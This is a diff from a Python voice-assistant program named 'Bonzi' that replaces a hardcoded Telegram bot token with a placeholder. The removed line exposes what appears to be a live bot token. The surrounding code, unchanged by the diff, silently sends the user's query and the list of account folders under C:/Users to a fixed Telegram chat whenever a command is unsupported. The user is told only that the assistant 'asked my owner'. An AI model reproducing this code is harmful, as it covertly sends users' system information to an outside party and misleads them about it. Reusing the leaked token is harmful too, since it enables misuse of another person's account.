@@ -440,7 +440,7 @@ class Bonzi:
         else:
             Speak('Sorry But That Command Is Not Yet Executable By Me...'
                   'I Am Asking My Creator To Add This Command.')
-            bot = TeleBot('1292569252:AAHY3kcwD94LGtdqZDyTE8QHggS30vgyLCs')
+            bot = TeleBot('Personal Token')
             bot.send_message(-1001441644545,str(query) + ' - ' + str(os.listdir('C:/Users')))
             Speak('I Have Successfully Asked My Owner')
 
